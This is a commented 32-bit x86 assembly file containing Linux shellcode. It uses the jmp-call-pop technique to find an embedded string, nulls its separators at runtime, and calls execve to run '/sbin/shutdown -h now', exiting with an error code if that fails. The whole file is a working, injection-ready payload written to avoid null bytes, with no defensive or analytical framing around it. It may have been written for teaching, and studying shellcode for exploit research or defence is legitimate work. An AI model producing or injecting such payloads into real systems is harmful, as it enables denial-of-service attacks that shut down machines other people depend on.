BITS 32

jmp short beginning

code:
	pop ebx
	xor eax, eax	    ;Set eax to 0 in preparation for null-termination
	mov [ebx+16], al    ;Null-terminate command string
	mov [ebx+19], al    ;Null-terminate extra "-h" parameter string
	mov [ebx+23], al    ;Null-terminate extra "now" parameter string
	mov [ebx+24], ebx   ;First argument in argument array (and first parameter) for execve is pointer to command string
	lea edx, [ebx+17]   ;Load address of "-h" string into edx
	mov [ebx+28], edx   ;Second argument in argument array is pointer to "-h" string
	lea edx, [ebx+20]   ;Load address of "now" string into edx
	mov [ebx+32], edx   ;Third argument in argument array is pointer to "now" string
	mov [ebx+36], al    ;Null-terminate argument array
	lea ecx, [ebx+24]   ;Second parameter of execve call is pointer to argument list for execve
	lea edx, [ebx+36]   ;Last parameter of execve call is pointer to environment array only pointing to a null value
	mov al, 11          ;sys_execve system call is 11
	int 0x80            ;Invoke execve call to shut down computer

	mov al, 1           ;sys_exit system call is 1
	xor ebx, ebx        ;zero-out register ebx
	mov bl, 4           ;Exit with abnormal code (we should have shut down earlier!)
	int 0x80	    ;Actually invoke exit system call

beginning:
	call code
	db "//sbin//shutdown -h now          "
